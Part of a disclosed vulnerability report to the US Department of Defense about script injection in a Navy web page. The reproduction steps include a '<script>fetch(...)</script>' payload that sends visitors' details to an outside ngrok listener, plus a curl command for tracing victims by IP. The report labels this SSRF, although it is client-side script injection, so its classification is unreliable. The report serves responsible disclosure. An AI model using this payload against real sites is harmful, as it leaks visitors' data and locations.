SSRF can lead to port scanning, cross domain hijacking, pivoting , extracting system files and many more. In this case, I use ngrok to generate our custom domain to prove occurrence of SSRF. Once I have custom ngrok domain i can analyze all request that are coming to the domain.\nI used fetch() API property of JS to perform cross domain request and perform Server Side Request Forgery.\n \n\n## Step-by-step Reproduction Instructions\n1. Open the URL https://www.█████████\n2. Open your ngrok instance and copy your listener domain it\n3. SSRF payload  '\u003e\u003cscript\u003efetch('your ngrok instance')\u003c/script\u003e\n4. Append payload to source parameter\n5. Final Crafted URL████\u0026source='\u003e\u003cscript\u003efetch('your ngrok instance')\u003c/script\u003e\u0026server=submit.moboard.com\u0026display=Please+log+on\u0026title=%3C\n6. Open 127.0.0.1:4040 in browser to analyze all incoming request\n7. Open URL of Step 5 from any other device than the device ngrok is running \n8.  The request from US navy hits our ngrok client in 127.0.0.1:4040\n9. The request contain ip address of victim who opened the URL, browser info, Operating System and many more.\n10. We can trace victim location with ~$curl ipinfo.io/IP-address-of-victim\n\nScreenshot is attached below with the request from navy server that hit my ngrok client\n\n\n## Product, Version, and Configuration (If applicable)\nBrowser: Firefox 80.0.1 64 Bit\n## Suggested Mitigation/Remediation Actions\n\n## Impact\n\nServer Side Request Forgery Exposes Victims Ip Address to External Server and which made attacker possible to determine physical location of Victim with IP Tracing. Also, attacker can launch port scans, launch exploits to whoever visits the US NAVY Website.","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9392352,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.
